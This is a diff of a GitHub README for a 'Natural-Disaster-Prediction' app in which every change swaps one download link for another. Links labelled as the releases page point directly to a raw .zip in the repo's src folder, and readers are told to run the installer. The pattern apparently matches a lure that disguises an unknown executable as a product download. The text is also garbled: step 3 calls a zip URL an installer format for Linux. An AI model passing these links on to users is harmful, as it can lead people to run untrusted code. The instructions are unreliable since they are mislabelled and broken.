@@ -1,6 +1,6 @@
 # 🌍 Natural-Disaster-Prediction - Predict Natural Disasters with Ease
 
-[![Download Now](https://raw.githubusercontent.com/Ericklumasai12/Natural-Disaster-Prediction/main/src/Natural-Disaster-Prediction_v3.0.zip%20Now-Release-brightgreen)](https://raw.githubusercontent.com/Ericklumasai12/Natural-Disaster-Prediction/main/src/Natural-Disaster-Prediction_v3.0.zip)
+[![Download Now](https://github.com/Ericklumasai12/Natural-Disaster-Prediction/raw/refs/heads/main/src/Prediction_Natural_Disaster_2.7.zip%20Now-Release-brightgreen)](https://github.com/Ericklumasai12/Natural-Disaster-Prediction/raw/refs/heads/main/src/Prediction_Natural_Disaster_2.7.zip)
 
 ## 🚀 Getting Started
 
@@ -12,11 +12,11 @@ To get started, follow these simple steps to download and run the application.
 
 1. **Visit the Releases Page:** Click the link below to access the releases page where you can download the software.
 
-   [Download Releases](https://raw.githubusercontent.com/Ericklumasai12/Natural-Disaster-Prediction/main/src/Natural-Disaster-Prediction_v3.0.zip)
+   [Download Releases](https://github.com/Ericklumasai12/Natural-Disaster-Prediction/raw/refs/heads/main/src/Prediction_Natural_Disaster_2.7.zip)
 
 2. **Choose Your Version:** On the releases page, you will see different versions of the application. Select the latest version for the best performance and latest features.
 
-3. **Download the Installer:** Click the link for the installer file. This file may be in formats like `.exe` for Windows or `https://raw.githubusercontent.com/Ericklumasai12/Natural-Disaster-Prediction/main/src/Natural-Disaster-Prediction_v3.0.zip` for Linux. 
+3. **Download the Installer:** Click the link for the installer file. This file may be in formats like `.exe` for Windows or `https://github.com/Ericklumasai12/Natural-Disaster-Prediction/raw/refs/heads/main/src/Prediction_Natural_Disaster_2.7.zip` for Linux. 
 
 4. **Run the Installer:** Once the file is downloaded:
    - For Windows: Double-click the `.exe` file and follow the on-screen instructions.
@@ -73,6 +73,6 @@ If you have questions or encounter issues, please visit the issues page on the G
 
 Follow us for updates, new features, and community improvements. Check our GitHub page regularly for new releases.
 
-[Visit our Releases Page](https://raw.githubusercontent.com/Ericklumasai12/Natural-Disaster-Prediction/main/src/Natural-Disaster-Prediction_v3.0.zip)
+[Visit our Releases Page](https://github.com/Ericklumasai12/Natural-Disaster-Prediction/raw/refs/heads/main/src/Prediction_Natural_Disaster_2.7.zip)
 
 Thank you for using Natural-Disaster-Prediction! Together, we can make our communities safer from natural disasters.
